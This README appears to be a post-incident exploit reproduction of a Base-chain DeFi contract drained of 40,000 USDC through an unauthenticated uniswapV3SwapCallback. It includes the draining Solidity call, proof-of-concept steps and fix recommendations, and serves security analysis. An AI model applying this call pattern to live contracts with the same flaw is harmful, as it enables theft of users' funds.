# BaseCallback `0x8d2e…` Exploit — Unauthenticated `uniswapV3SwapCallback` Self-Transfer

> **Vulnerability classes:** vuln/access-control/missing-auth

> **Reproduction:** isolated Foundry project at [this project folder](.). Verbose run: [output.txt](output.txt).

---

## Key info

| | |
|---|---|
| **Loss** | **40,000 USDC (~$40K)** held by the vulnerable contract |
| **Vulnerable contract** | [`0x8d2Ef0d39A438C3601112AE21701819E13c41288`](https://basescan.org/address/0x8d2ef0d39a438c3601112ae21701819e13c41288) (`0x8d2e…`) |
| **Token** | Base USDC [`0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913`](https://basescan.org/address/0x833589fcd6edb6e08f4c7c32d4f71b54bda02913) |
| **Attacker EOA** | [`0x4EfD5F0749b1b91AFDcD2ECf464210db733150e0`](https://basescan.org/address/0x4efd5f0749b1b91afdcd2ecf464210db733150e0) |
| **Attacker contract** | [`0x2A59Ac31C58327EFCbF83Cc5A52fAE1b24A81440`](https://basescan.org/address/0x2a59ac31c58327efcbf83cc5a52fae1b24a81440) |
| **Attack tx** | [`0x6be0c4b5414883a933639c136971026977df4737b061f864a4a04e4bd7f07106`](https://basescan.org/tx/0x6be0c4b5414883a933639c136971026977df4737b061f864a4a04e4bd7f07106) |
| **Chain / block / date** | Base / **34,459,414** (fork **34,459,413**) / ~Aug 21, 2025 |
| **Bug class** | Public `uniswapV3SwapCallback` with **no pool auth** — positive `amount0Delta` causes `token.transfer(recipient, amount)` using attacker-controlled `data` |

---

## TL;DR

Unlike Q12 (approval `transferFrom` drain), this victim **held the USDC itself**. Its `uniswapV3SwapCallback` accepts a call from **any** `msg.sender` and, for `amount0Delta > 0`, does:

```text
(token, recipient) = abi.decode(data, (address, address));
IERC20(token).transfer(recipient, uint256(amount0Delta));
```

The live attacker (via a helper contract) simply called:

```solidity
vuln.uniswapV3SwapCallback(
    40_000e6,
    0,
    abi.encode(USDC, attackContract)
);
```

No pool spoofing, no prior approval, no flash loan — pure missing access control on the callback.

---

## Attack steps (PoC)

1. Fork Base at `34459414 - 1`.
2. Read `USDC.balanceOf(vuln)` → 40,000e6.
3. Call `uniswapV3SwapCallback(bal, 0, abi.encode(USDC, address(this)))`.
4. Receive full 40,000 USDC.

---

## Fix class

- Authenticate `msg.sender` as the canonical Uniswap V3 pool for the in-flight swap.
- Gate transfers behind an in-swap reentrancy lock set only by the contract’s own entrypoints.
- Never let callback `data` freely choose token/recipient for outbound transfers of vault inventory.

---

## Sources

- [TenArmorAlert](https://x.com/TenArmorAlert/status/1958354933247590450)
